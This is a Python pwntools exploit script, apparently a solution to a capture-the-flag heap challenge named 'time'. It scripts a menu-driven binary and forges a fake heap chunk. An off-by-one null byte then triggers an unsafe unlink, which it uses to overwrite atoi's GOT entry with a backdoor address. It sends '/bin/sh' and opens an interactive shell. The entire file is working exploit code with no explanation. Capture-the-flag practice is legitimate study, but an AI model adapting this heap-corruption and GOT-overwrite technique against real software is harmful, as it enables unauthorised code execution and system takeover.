from pwn import *

p = process("./time")
#p = remote("pwn.challenge.mini.lctf.online",10065)
elf = ELF("./time")
libc = ELF("libc.so.6")

atoi_got = elf.got[b"atoi"]
back_door = 0x400C9F

context.log_level = "debug"

def setplan(size:int,content):
    p.recvuntil(b"Your choice : ")
    p.sendline(b"1")
    p.recvuntil(b"How many minutes will it take you to finish?\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content of the plan: ")
    p.sendline(content)
    
def edit(idx:int,size:int,content):
    p.recvuntil(b"Your choice : ")
    p.sendline(b"2")  
    p.recvuntil(b"Index : ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"How many minutes will it take you to finish?\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content of the plan: ")
    p.sendline(content)    
    
def end(idx:int):
    p.recvuntil(b"Your choice : ")
    p.sendline(b"3")  
    p.recvuntil(b"Index : ")
    p.sendline(str(idx).encode())
    
    
def exp():
    setplan(0x30,b"aaaa") #idx0
    setplan(0,b"a"*0x18) #idx1
    setplan(0xf0,b"aaaa") #idx2
    setplan(0x10,b"aaaa") #idx3
    #gdb.attach(p)
    ptr = 0x6020C0
    fd = ptr - 0x18
    bk = ptr - 0x10
    payload1 = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20) + p64(0) #fake chunk
    edit(0,0,payload1)
    payload2 = b"a"*0x10 + p64(0x50) + b"\x00"
    edit(1,0,payload2)
    end(2)
    payload3 = p64(0)*3 + p64(atoi_got)
    edit(0,0,payload3)
    #gdb.attach(p)
    edit(0,0,p64(back_door))
    
    p.sendline(b"/bin/sh")
    p.interactive()
    
if __name__ == "__main__":
    exp()
